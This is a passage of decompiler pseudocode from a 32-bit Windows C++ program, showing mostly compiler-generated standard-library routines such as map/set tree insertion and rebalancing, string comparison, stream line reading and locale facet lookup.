LABEL_46:
              v26 = v52;
              if ( v49 >= 0x10 )
                v26 = (int *)v48;
LABEL_64:
              v30 = 127;
              if ( v50 < 0x7F )
                v30 = v50;
              *((_BYTE *)v26 + v10) = v30;
              v9 = v52[0];
              v12 = a4;
              v48 = v52[0];
              v49 = v53;
              goto LABEL_67;
            }
          }
          else if ( !v25 )
          {
            goto LABEL_46;
          }
          if ( !*(_BYTE *)(a1 + 4) )
          {
            if ( !v24
              || ((v27 = (unsigned __int8 *)*v24[7]) == 0 || (int)*v24[11] <= 0
                ? (v28 = ((int (__thiscall *)(_DWORD **))(*v24)[6])(v24))
                : (v28 = *v27),
                  v28 == -1) )
            {
              *(_DWORD *)a1 = 0;
            }
            else
            {
              *(_BYTE *)(a1 + 5) = v28;
            }
            *(_BYTE *)(a1 + 4) = 1;
          }
          if ( *v45 == *(_BYTE *)(a1 + 5) )
          {
            v12 = a4;
            v29 = 1;
            v9 = v48;
            v51 = 1;
            goto LABEL_68;
          }
          goto LABEL_46;
        }
        v21 = (_DWORD **)*a2;
        if ( *a2 )
        {
          v22 = (unsigned __int8 *)*v21[7];
          if ( v22 && (int)*v21[11] > 0 )
            v23 = *v22;
          else
            v23 = ((int (__thiscall *)(_DWORD **))(*v21)[6])(v21);
          if ( v23 != -1 )
          {
            *((_BYTE *)a2 + 5) = v23;
            v20 = a2;
LABEL_43:
            *((_BYTE *)v20 + 4) = 1;
            goto LABEL_44;
          }
          v20 = a2;
        }
        *v20 = 0;
        goto LABEL_43;
      }
      v15 = v52;
      if ( v49 >= 0x10 )
        v15 = (int *)v9;
      v11 += *((char *)v15 + v10);
LABEL_67:
      v29 = v51;
LABEL_68:
      ++v10;
    }
    while ( v10 < v47 );
    if ( v29 )
    {
      if ( !*(_BYTE *)(a1 + 4) )
      {
        v31 = *(_DWORD ***)a1;
        if ( !*(_DWORD *)a1
          || ((v32 = (unsigned __int8 *)*v31[7]) == 0 || (int)*v31[11] <= 0
            ? (v33 = ((int (__thiscall *)(_DWORD **))(*v31)[6])(v31))
            : (v33 = *v32),
              v33 == -1) )
        {
          *(_DWORD *)a1 = 0;
        }
        else
        {
          *(_BYTE *)(a1 + 5) = v33;
        }
        *(_BYTE *)(a1 + 4) = 1;
      }
      if ( !*((_BYTE *)a2 + 4) )
      {
        v34 = (_DWORD **)*a2;
        if ( !*a2
          || ((v35 = (unsigned __int8 *)*v34[7]) == 0 || (int)*v34[11] <= 0
            ? (v36 = ((int (__thiscall *)(_DWORD **))(*v34)[6])(v34))
            : (v36 = *v35),
              v36 == -1) )
        {
          *a2 = 0;
        }
        else
        {
          *((_BYTE *)a2 + 5) = v36;
        }
        *((_BYTE *)a2 + 4) = 1;
      }
      v37 = *(_DWORD ***)a1;
      v38 = (_DWORD **)*a2;
      if ( *(_DWORD *)a1 )
      {
        if ( !v38 )
        {
LABEL_97:
          ++v50;
          if ( !v37
            || (!*v37[7] || (v40 = v37[11], *v40 <= 0)
              ? (v43 = ((int (__thiscall *)(_DWORD **))(*v37)[7])(v37))
              : (--*v40, v41 = (unsigned __int8 **)v37[7], v42 = *v41, ++*v41, v43 = *v42),
                v43 == -1) )
          {
            v9 = v48;
            *(_DWORD *)a1 = 0;
            *(_BYTE *)(a1 + 4) = 1;
            v46 = -1;
          }
          else
          {
            v9 = v48;
            *(_BYTE *)(a1 + 4) = 0;
            v46 = -1;
          }
          continue;
        }
      }
      else if ( v38 )
      {
        goto LABEL_97;
      }
    }
    break;
  }
  if ( v49 >= 0x10 )
  {
    v39 = (void *)v48;
    if ( v49 + 1 >= 0x1000 )
    {
      v39 = *(void **)(v48 - 4);
      if ( (unsigned int)(v48 - (_DWORD)v39 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v39);
  }
  return v46;
}

//----- (00429910) --------------------------------------------------------
_DWORD *__thiscall sub_429910(_DWORD *this, _DWORD *a2, char a3, _DWORD *a4, int a5, _DWORD *a6)
{
  unsigned int v6; // eax
  _DWORD *v7; // ebx
  _DWORD *v8; // edx
  _DWORD *v9; // ecx
  _DWORD *v10; // edi
  int *v11; // esi
  _DWORD *v12; // ebx
  _DWORD *v13; // eax
  _DWORD *v14; // esi
  _DWORD *v15; // eax
  _DWORD *v16; // ecx
  _DWORD *v17; // esi
  int v18; // eax
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  int v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  _DWORD *result; // eax
  _DWORD *v25; // [esp+0h] [ebp-4h]

  v6 = this[1];
  v25 = this;
  if ( v6 >= 0x3FFFFFE )
  {
    sub_42B160(a6);
    sub_46A183((int)"map/set<T> too long");
  }
  v7 = a6;
  this[1] = v6 + 1;
  a6[1] = a4;
  if ( a4 == (_DWORD *)*this )
  {
    *(_DWORD *)(*this + 4) = a6;
    *(_DWORD *)*this = a6;
    *(_DWORD *)(*this + 8) = a6;
  }
  else if ( a3 )
  {
    *a4 = a6;
    if ( a4 == *(_DWORD **)*this )
      *(_DWORD *)*this = a6;
  }
  else
  {
    a4[2] = a6;
    if ( a4 == *(_DWORD **)(*this + 8) )
      *(_DWORD *)(*this + 8) = a6;
  }
  v8 = a6;
  if ( !*(_BYTE *)(a6[1] + 12) )
  {
    while ( 1 )
    {
      v9 = (_DWORD *)v8[1];
      v10 = v8 + 1;
      v11 = (int *)v9[1];
      v12 = v9 + 1;
      v13 = (_DWORD *)*v11;
      if ( v9 == (_DWORD *)*v11 )
      {
        v13 = (_DWORD *)v11[2];
        if ( *((_BYTE *)v13 + 12) )
        {
          v14 = (_DWORD *)v9[2];
          if ( v8 == v14 )
          {
            v8 = (_DWORD *)v8[1];
            v9[2] = *v14;
            if ( !*(_BYTE *)(*v14 + 13) )
              *(_DWORD *)(*v14 + 4) = v9;
            v14[1] = *v12;
            if ( v9 == *(_DWORD **)(*v25 + 4) )
            {
              *(_DWORD *)(*v25 + 4) = v14;
              v10 = v9 + 1;
              *v14 = v9;
              *v12 = v14;
            }
            else
            {
              v15 = (_DWORD *)*v12;
              if ( v9 == *(_DWORD **)*v12 )
                *v15 = v14;
              else
                v15[2] = v14;
              v10 = v9 + 1;
              *v14 = v9;
              *v12 = v14;
            }
          }
          else
          {
            v14 = (_DWORD *)v8[1];
          }
          *((_BYTE *)v14 + 12) = 1;
          *(_BYTE *)(*(_DWORD *)(*v10 + 4) + 12) = 0;
          v16 = *(_DWORD **)(*v10 + 4);
          v17 = (_DWORD *)*v16;
          *v16 = *(_DWORD *)(*v16 + 8);
          v18 = v17[2];
          if ( !*(_BYTE *)(v18 + 13) )
            *(_DWORD *)(v18 + 4) = v16;
          v17[1] = v16[1];
          if ( v16 == *(_DWORD **)(*v25 + 4) )
          {
            *(_DWORD *)(*v25 + 4) = v17;
            v17[2] = v16;
          }
          else
          {
            v19 = (_DWORD *)v16[1];
            if ( v16 == (_DWORD *)v19[2] )
              v19[2] = v17;
            else
              *v19 = v17;
            v17[2] = v16;
          }
LABEL_49:
          v16[1] = v17;
          goto LABEL_50;
        }
      }
      else if ( *((_BYTE *)v13 + 12) )
      {
        v20 = (_DWORD *)*v9;
        if ( v8 == (_DWORD *)*v9 )
        {
          v8 = (_DWORD *)v8[1];
          v9 = (_DWORD *)*v9;
          *v8 = v20[2];
          v21 = v20[2];
          if ( !*(_BYTE *)(v21 + 13) )
            *(_DWORD *)(v21 + 4) = v8;
          v9[1] = *v12;
          if ( v8 == *(_DWORD **)(*v25 + 4) )
          {
            *(_DWORD *)(*v25 + 4) = v9;
          }
          else
          {
            v22 = (_DWORD *)*v12;
            if ( v8 == *(_DWORD **)(*v12 + 8) )
              v22[2] = v9;
            else
              *v22 = v9;
          }
          v9[2] = v8;
          v10 = v12;
          *v12 = v9;
        }
        *((_BYTE *)v9 + 12) = 1;
        *(_BYTE *)(*(_DWORD *)(*v10 + 4) + 12) = 0;
        v16 = *(_DWORD **)(*v10 + 4);
        v17 = (_DWORD *)v16[2];
        v16[2] = *v17;
        if ( !*(_BYTE *)(*v17 + 13) )
          *(_DWORD *)(*v17 + 4) = v16;
        v17[1] = v16[1];
        if ( v16 == *(_DWORD **)(*v25 + 4) )
        {
          *(_DWORD *)(*v25 + 4) = v17;
        }
        else
        {
          v23 = (_DWORD *)v16[1];
          if ( v16 == (_DWORD *)*v23 )
            *v23 = v17;
          else
            v23[2] = v17;
        }
        *v17 = v16;
        goto LABEL_49;
      }
      *((_BYTE *)v9 + 12) = 1;
      *((_BYTE *)v13 + 12) = 1;
      *(_BYTE *)(*(_DWORD *)(*v10 + 4) + 12) = 0;
      v8 = *(_DWORD **)(*v10 + 4);
LABEL_50:
      if ( *(_BYTE *)(v8[1] + 12) )
      {
        this = v25;
        v7 = a6;
        break;
      }
    }
  }
  *(_BYTE *)(*(_DWORD *)(*this + 4) + 12) = 1;
  result = a2;
  *a2 = v7;
  return result;
}

//----- (00429B40) --------------------------------------------------------
_DWORD *__thiscall sub_429B40(int *this, _DWORD *a2, int *a3, int *a4, _DWORD *a5)
{
  int *v5; // edi
  bool v6; // zf
  int *v7; // eax
  _DWORD *result; // eax
  int v9; // ecx
  int *v10; // ebx
  int v11; // edx
  _DWORD *v12; // esi
  int **v13; // eax
  int *v14; // eax
  int v15; // ecx
  int *v16; // edi
  int v17; // ecx
  int v18; // [esp+0h] [ebp-30h] BYREF
  char v19[8]; // [esp+10h] [ebp-20h] BYREF
  int *v20; // [esp+18h] [ebp-18h]
  int *v21[2]; // [esp+1Ch] [ebp-14h] BYREF
  int v22; // [esp+2Ch] [ebp-4h]

  v21[1] = &v18;
  v5 = this;
  v20 = this;
  v6 = this[1] == 0;
  v7 = (int *)*this;
  v21[0] = 0;
  v22 = 0;
  if ( v6 )
  {
    sub_429910(this, a2, 1, v7, (int)a4, a5);
    return a2;
  }
  if ( a3 == (int *)*v7 )
  {
    v9 = (int)(a3 + 4);
    if ( (unsigned int)a3[9] >= 0x10 )
      v9 = a3[4];
    v10 = a4;
    v11 = (int)a4;
    if ( (unsigned int)a4[5] >= 0x10 )
      v11 = *a4;
    if ( sub_429FB0(v11, a4[4], v9, a3[8]) < 0 )
    {
      sub_429910(v5, a2, 1, a3, (int)a4, a5);
      return a2;
    }
    goto LABEL_27;
  }
  v10 = a4;
  if ( a3 == v7 )
  {
    v12 = (_DWORD *)v7[2];
    if ( (unsigned __int8)sub_42AEE0(v12 + 4, a4) )
    {
      sub_429910(v5, a2, 0, v12, (int)a4, a5);
      return a2;
    }
    goto LABEL_27;
  }
  if ( (unsigned __int8)sub_42AEE0(a4, a3 + 4) )
  {
    v21[0] = a3;
    v13 = sub_42AE50(v21);
    if ( (unsigned __int8)sub_42AEE0(*v13 + 4, a4) )
    {
      if ( *(_BYTE *)(v21[0][2] + 13) )
        sub_429910(v5, a2, 0, v21[0], (int)a4, a5);
      else
        sub_429910(v5, a2, 1, a3, (int)a4, a5);
      return a2;
    }
  }
  if ( !(unsigned __int8)sub_42AEE0(a3 + 4, a4) )
  {
LABEL_27:
    v22 = -1;
    v17 = *(_DWORD *)sub_429DB0(v5, (int)v19, 0, v10, a5);
    result = a2;
    *a2 = v17;
    return result;
  }
  v21[0] = a3;
  v14 = sub_421640((int *)v21);
  v15 = *v5;
  v16 = v21[0];
  if ( *v14 != v15 && !(unsigned __int8)sub_42AEE0(a4, v21[0] + 4) )
  {
    v5 = v20;
    goto LABEL_27;
  }
  if ( *(_BYTE *)(a3[2] + 13) )
    sub_429910(v20, a2, 0, a3, (int)a4, a5);
  else
    sub_429910(v20, a2, 1, v16, (int)a4, a5);
  return a2;
}
// 429B40: using guessed type char var_20[8];

//----- (00429DB0) --------------------------------------------------------
int __thiscall sub_429DB0(_DWORD *this, int a2, _DWORD *a3, int *a4, _DWORD *a5)
{
  _DWORD *v5; // edx
  unsigned int v6; // eax
  int *v7; // edi
  _DWORD *v8; // ebx
  int *v9; // esi
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  int v13; // ecx
  _DWORD *v14; // esi
  int *v15; // eax
  int v16; // ecx
  int result; // eax
  int v18; // edx
  int v19; // ecx
  void *v20; // edi
  int v21; // [esp+0h] [ebp-2Ch] BYREF
  _DWORD *v22; // [esp+10h] [ebp-1Ch]
  _DWORD *v23; // [esp+14h] [ebp-18h]
  int v24; // [esp+18h] [ebp-14h]
  int *v25; // [esp+1Ch] [ebp-10h]
  int v26; // [esp+28h] [ebp-4h]

  v25 = &v21;
  v23 = this;
  v5 = (_DWORD *)*this;
  LOBYTE(v6) = 1;
  v7 = a4;
  v8 = (_DWORD *)*this;
  v26 = 0;
  v22 = v5;
  LOBYTE(v24) = 1;
  v9 = (int *)v8[1];
  if ( !*((_BYTE *)v9 + 13) )
  {
    do
    {
      v8 = v9;
      if ( (_BYTE)a3 )
      {
        v10 = (int)v7;
        if ( (unsigned int)v7[5] >= 0x10 )
          v10 = *v7;
        v11 = (int)(v9 + 4);
        if ( (unsigned int)v9[9] >= 0x10 )
          v11 = v9[4];
        LOBYTE(v6) = sub_429FB0(v11, v9[8], v10, v7[4]) >= 0;
      }
      else
      {
        v12 = (int)(v9 + 4);
        if ( (unsigned int)v9[9] >= 0x10 )
          v12 = v9[4];
        v13 = (int)v7;
        if ( (unsigned int)v7[5] >= 0x10 )
          v13 = *v7;
        v6 = (unsigned int)sub_429FB0(v13, v7[4], v12, v9[8]) >> 31;
      }
      LOBYTE(v24) = v6;
      if ( (_BYTE)v6 )
        v9 = (int *)*v9;
      else
        v9 = (int *)v9[2];
    }
    while ( !*((_BYTE *)v9 + 13) );
    this = v23;
    v5 = v22;
  }
  v14 = v8;
  a3 = v8;
  if ( (_BYTE)v6 )
  {
    if ( v8 == (_DWORD *)*v5 )
    {
      v15 = sub_429910(this, &a3, 1, v8, (int)v7, a5);
LABEL_21:
      v16 = *v15;
      result = a2;
      *(_DWORD *)a2 = v16;
      *(_BYTE *)(a2 + 4) = 1;
      return result;
    }
    sub_42AE50(&a3);
    v14 = a3;
  }
  v18 = (int)v7;
  if ( (unsigned int)v7[5] >= 0x10 )
    v18 = *v7;
  v19 = (int)(v14 + 4);
  if ( v14[9] >= 0x10u )
    v19 = v14[4];
  if ( sub_429FB0(v19, v14[8], v18, v7[4]) < 0 )
  {
    v15 = sub_429910(v23, &a3, v24, v8, (int)v7, a5);
    goto LABEL_21;
  }
  v20 = a5;
  sub_425620(a5 + 4);
  sub_46C87D(v20);
  result = a2;
  *(_DWORD *)a2 = v14;
  *(_BYTE *)(a2 + 4) = 0;
  return result;
}

//----- (00429F50) --------------------------------------------------------
int *__thiscall sub_429F50(int *this, int *a2)
{
  int *v2; // ebx
  int *v3; // esi
  int v4; // edx
  int v5; // ecx

  v2 = (int *)*this;
  v3 = *(int **)(*this + 4);
  while ( !*((_BYTE *)v3 + 13) )
  {
    v4 = (int)a2;
    if ( (unsigned int)a2[5] >= 0x10 )
      v4 = *a2;
    v5 = (int)(v3 + 4);
    if ( (unsigned int)v3[9] >= 0x10 )
      v5 = v3[4];
    if ( sub_429FB0(v5, v3[8], v4, a2[4]) >= 0 )
    {
      v2 = v3;
      v3 = (int *)*v3;
    }
    else
    {
      v3 = (int *)v3[2];
    }
  }
  return v2;
}

//----- (00429FB0) --------------------------------------------------------
int __cdecl sub_429FB0(int a1, unsigned int a2, int a3, unsigned int a4)
{
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  bool v8; // cf
  unsigned __int8 v9; // al
  unsigned __int8 v10; // al
  unsigned __int8 v11; // al
  int result; // eax

  v6 = a2;
  if ( a4 < a2 )
    v6 = a4;
  v8 = v6 < 4;
  v7 = v6 - 4;
  if ( v8 )
  {
LABEL_6:
    if ( v7 == -4 )
      goto LABEL_15;
  }
  else
  {
    while ( *(_DWORD *)a1 == *(_DWORD *)a3 )
    {
      a1 += 4;
      a3 += 4;
      v8 = v7 < 4;
      v7 -= 4;
      if ( v8 )
        goto LABEL_6;
    }
  }
  v8 = *(_BYTE *)a1 < *(_BYTE *)a3;
  if ( *(_BYTE *)a1 != *(_BYTE *)a3
    || v7 != -3
    && ((v9 = *(_BYTE *)(a1 + 1), v8 = v9 < *(_BYTE *)(a3 + 1), v9 != *(_BYTE *)(a3 + 1))
     || v7 != -2
     && ((v10 = *(_BYTE *)(a1 + 2), v8 = v10 < *(_BYTE *)(a3 + 2), v10 != *(_BYTE *)(a3 + 2))
      || v7 != -1 && (v11 = *(_BYTE *)(a1 + 3), v8 = v11 < *(_BYTE *)(a3 + 3), v11 != *(_BYTE *)(a3 + 3)))) )
  {
    result = v8 ? -1 : 1;
    goto LABEL_16;
  }
LABEL_15:
  result = 0;
LABEL_16:
  if ( !result )
  {
    if ( a4 <= a2 )
      return a4 < a2;
    else
      return -1;
  }
  return result;
}

//----- (0042A040) --------------------------------------------------------
_BYTE *__cdecl sub_42A040(_BYTE *a1, int a2, unsigned __int8 a3)
{
  char v3; // di
  char v4; // bl
  int v5; // ecx
  int v6; // ecx
  _BYTE *v7; // eax
  bool v8; // cf
  _DWORD **v9; // edx
  int v10; // eax
  int v11; // eax
  _DWORD **v12; // ecx
  int *v13; // edx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  _DWORD *v17; // edx
  char v18; // al
  char v19; // cl
  int v20; // eax
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  char *v25; // esi
  int *v26; // eax
  int v27; // [esp+0h] [ebp-50h] BYREF
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-40h] BYREF
  _BYTE *v29; // [esp+24h] [ebp-2Ch]
  char v30; // [esp+28h] [ebp-28h]
  _DWORD v31[2]; // [esp+2Ch] [ebp-24h] BYREF
  int v32; // [esp+34h] [ebp-1Ch]
  unsigned __int8 *v33; // [esp+38h] [ebp-18h]
  char v34; // [esp+3Fh] [ebp-11h]
  int *v35; // [esp+40h] [ebp-10h]
  int v36; // [esp+4Ch] [ebp-4h]

  v35 = &v27;
  v3 = 0;
  v4 = 0;
  v31[1] = 0;
  v34 = 0;
  v29 = a1;
  v5 = *(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56];
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  v36 = 0;
  v30 = sub_427AC0(a1, 1);
  v36 = 1;
  if ( !v30 )
    goto LABEL_22;
  v6 = a2;
  v7 = (_BYTE *)a2;
  LOBYTE(v36) = 2;
  v8 = *(_DWORD *)(a2 + 20) < 0x10u;
  *(_DWORD *)(a2 + 16) = 0;
  if ( !v8 )
    v7 = *(_BYTE **)a2;
  *v7 = 0;
  v32 = a3;
  v9 = *(_DWORD ***)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56];
  v33 = (unsigned __int8 *)*v9[7];
  if ( !v33 || (int)*v9[11] <= 0 )
  {
    v10 = ((int (__thiscall *)(_DWORD **))(*v9)[6])(v9);
    goto LABEL_10;
  }
  v10 = *v33;
  while ( 1 )
  {
    if ( v10 == -1 )
    {
      v3 = 1;
      goto LABEL_21;
    }
    if ( v10 == v32 )
      break;
    if ( *(_DWORD *)(v6 + 16) >= 0x7FFFFFFFu )
    {
      v3 = 2;
      goto LABEL_21;
    }
    sub_41ED20((void **)v6, v10);
    v14 = *(_DWORD *)a1;
    v4 = 1;
    v34 = 1;
    v10 = sub_427660(*(_DWORD ***)&a1[*(_DWORD *)(v14 + 4) + 56]);
LABEL_10:
    v6 = a2;
  }
  v11 = *(_DWORD *)a1;
  v4 = 1;
  v34 = 1;
  v12 = *(_DWORD ***)&a1[*(_DWORD *)(v11 + 4) + 56];
  if ( *v12[7] && (v13 = v12[11], *v13 > 0) )
  {
    --*v13;
    ++*v12[7];
  }
  else
  {
    ((void (__thiscall *)(_DWORD **))(*v12)[7])(v12);
  }
LABEL_21:
  v36 = 1;
  if ( !v4 )
LABEL_22:
    v3 |= 2u;
  v15 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v16 = *(_DWORD *)&a1[v15 + 12];
  v17 = &a1[v15];
  v18 = v3 | v16;
  v19 = v18 | 4;
  if ( v17[14] )
    v19 = v18;
  v20 = v17[4];
  v21 = v19 & 0x17;
  v17[3] = v21;
  v22 = v21 & v20;
  if ( v22 )
  {
    if ( (v22 & 4) != 0 )
    {
      v25 = "ios_base::badbit set";
    }
    else
    {
      v25 = "ios_base::failbit set";
      if ( (v22 & 2) == 0 )
        v25 = "ios_base::eofbit set";
    }
    v26 = sub_402C50(v31, 1);
    sub_403590(pExceptionObject, v25, v26);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v36 = 4;
  v23 = *(_DWORD *)&v29[*(_DWORD *)(*(_DWORD *)v29 + 4) + 56];
  if ( v23 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v23 + 8))(v23);
  return a1;
}
// 42A040: using guessed type _DWORD pExceptionObject[5];

//----- (0042A240) --------------------------------------------------------
_DWORD *__cdecl sub_42A240(int a1)
{
  char v1; // bl
  unsigned int v2; // edi
  int v3; // ecx
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  const char *v7; // eax
  char v9[52]; // [esp+10h] [ebp-4Ch] BYREF
  int v10; // [esp+44h] [ebp-18h] BYREF
  _DWORD *v11; // [esp+48h] [ebp-14h]
  char v12[4]; // [esp+4Ch] [ebp-10h] BYREF
  int v13; // [esp+58h] [ebp-4h]

  v1 = 0;
  v10 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)&v10, 0);
  v2 = dword_4EEDB0;
  v13 = 0;
  v11 = (_DWORD *)dword_4EEDB8;
  if ( !dword_4EEDB0 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v12, 0);
    if ( !dword_4EEDB0 )
      dword_4EEDB0 = ++dword_4F0338;
    std::_Lockit::~_Lockit((std::_Lockit *)v12);
    v2 = dword_4EEDB0;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_25;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_25;
  }
  if ( v11 )
  {
    v4 = v11;
  }
  else
  {
    v4 = operator new(8u);
    v11 = v4;
    LOBYTE(v13) = 1;
    if ( v4 )
    {
      v6 = *(_DWORD *)(a1 + 4);
      if ( v6 )
      {
        v7 = *(const char **)(v6 + 24);
        if ( !v7 )
          v7 = (const char *)(v6 + 28);
      }
      else
      {
        v7 = (const char *)&unk_4CCC25;
      }
      sub_401AF0((int)v9, v7);
      v1 = 1;
      v4[1] = 0;
      *v4 = &std::num_get<char,std::istreambuf_iterator<char>>::`vftable';
    }
    else
    {
      v4 = 0;
    }
    if ( (v1 & 1) != 0 )
      sub_401BC0((int)v9);
    LOBYTE(v13) = 2;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
    dword_4EEDB8 = (int)v4;
  }
LABEL_25:
  std::_Lockit::~_Lockit((std::_Lockit *)&v10);
  return v4;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B87A4: using guessed type void *std::num_get<char,std::istreambuf_iterator<char>>::`vftable';
// 4EEDB0: using guessed type int dword_4EEDB0;
// 4EEDB8: using guessed type int dword_4EEDB8;
// 4F0338: using guessed type int dword_4F0338;
// 42A240: using guessed type char var_10[4];

//----- (0042A3A0) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_42A3A0(int a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ecx
  struct std::_Facet_base *v4; // esi
  int v5; // eax
  char pExceptionObject[12]; // [esp+10h] [ebp-24h] BYREF
  char v8[4]; // [esp+1Ch] [ebp-18h] BYREF
  char v9[4]; // [esp+20h] [ebp-14h] BYREF
  struct std::_Facet_base *v10; // [esp+24h] [ebp-10h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v8, 0);
  v1 = dword_4EEDA8;
  v2 = dword_4EEDB4;
  v11 = 0;
  v10 = (struct std::_Facet_base *)dword_4EEDB4;
  if ( !dword_4EEDA8 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v9, 0);
    if ( !dword_4EEDA8 )
      dword_4EEDA8 = ++dword_4F0338;
    std::_Lockit::~_Lockit((std::_Lockit *)v9);
    v1 = dword_4EEDA8;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(struct std::_Facet_base **)(*(_DWORD *)(v3 + 8) + 4 * v1);
    if ( v4 )
      goto LABEL_17;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v1 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(struct std::_Facet_base **)(*(_DWORD *)(v5 + 8) + 4 * v1);
LABEL_12:
    if ( v4 )
      goto LABEL_17;
  }
  if ( v2 )
  {
    v4 = (struct std::_Facet_base *)v2;
  }
  else
  {
    if ( sub_42B7C0(&v10, a1) == -1 )
    {
      sub_401A90(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_cast_std__);
    }
    v4 = v10;
    LOBYTE(v11) = 1;
    std::_Facet_Register(v10);
    (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v4 + 4))(v4);
    dword_4EEDB4 = (int)v4;
  }
LABEL_17:
  std::_Lockit::~_Lockit((std::_Lockit *)v8);
  return v4;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 4EEDA8: using guessed type int dword_4EEDA8;
// 4EEDB4: using guessed type int dword_4EEDB4;
// 4F0338: using guessed type int dword_4F0338;
// 42A3A0: using guessed type char var_18[4];
// 42A3A0: using guessed type char var_14[4];

//----- (0042A4C0) --------------------------------------------------------
_DWORD *__thiscall sub_42A4C0(_DWORD *this, _DWORD *Src, char a3, size_t Size)
{
  _DWORD *v5; // esi
  int v6; // eax
  int v7; // edx
  int v8; // eax
  size_t v9; // ecx
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  int v12; // eax
  int v13; // edx
  _DWORD *v14; // ecx
  int v16; // [esp+34h] [ebp+Ch]
  size_t Sizea; // [esp+38h] [ebp+10h]

  if ( Size )
  {
    *this = &unk_4B864C;
    this[24] = &std::ios::`vftable';
  }
  v5 = this + 4;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 24;
  v6 = *this;
  this[2] = 0;
  this[3] = 0;
  sub_421410((int)this + *(_DWORD *)(v6 + 4), (int)(this + 4), 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::istringstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 96;
  sub_421380(this + 4);
  *v5 = &std::stringbuf::`vftable';
  v7 = ~a3 & 2 | 8;
  if ( (a3 & 8) == 0 )
    v7 = ~a3 & 2;
  v8 = v7 | 0x10;
  if ( (a3 & 4) == 0 )
    v8 = v7;
  v16 = v8;
  v9 = Src[4];
  Sizea = v9;
  if ( Src[5] >= 0x10u )
    Src = (_DWORD *)*Src;
  if ( v9 > 0x7FFFFFFF )
    sub_46A166();
  if ( v9 )
  {
    v10 = sub_41FC00(v9);
    memmove(v10, Src, Sizea);
    v11 = (_DWORD *)this[7];
    this[18] = (char *)v10 + Sizea;
    *v11 = v10;
    *(_DWORD *)this[11] = v10;
    *(_DWORD *)this[15] = Sizea;
    v12 = v16;
    if ( (v16 & 2) == 0 )
    {
      v13 = this[18];
      v14 = v10;
      if ( (v16 & 0x18) != 0 )
        v14 = (_DWORD *)v5[14];
      *(_DWORD *)this[8] = v10;
      *(_DWORD *)this[12] = v14;
      *(_DWORD *)this[16] = v13 - (_DWORD)v14;
      v12 = v16;
    }
    v8 = v12 | 1;
  }
  else
  {
    this[18] = 0;
  }
  this[19] = v8;
  return this;
}
// 46A166: using guessed type void __noreturn sub_46A166(void);
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B85C4: using guessed type void *std::stringbuf::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';
// 4B8648: using guessed type void *std::istringstream::`vftable';

//----- (0042A650) --------------------------------------------------------
int __thiscall sub_42A650(int this, size_t *a2, __int16 a3)
{
  sub_432220((_DWORD *)this);
  sub_4288D0((_BYTE *)(this + 36));
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 15;
  *(_BYTE *)(this + 44) = 0;
  sub_431C00(this, a2, a3);
  return this;
}

//----- (0042A6D0) --------------------------------------------------------
int __thiscall sub_42A6D0(int this)
{
  sub_432220((_DWORD *)this);
  sub_4288D0((_BYTE *)(this + 36));
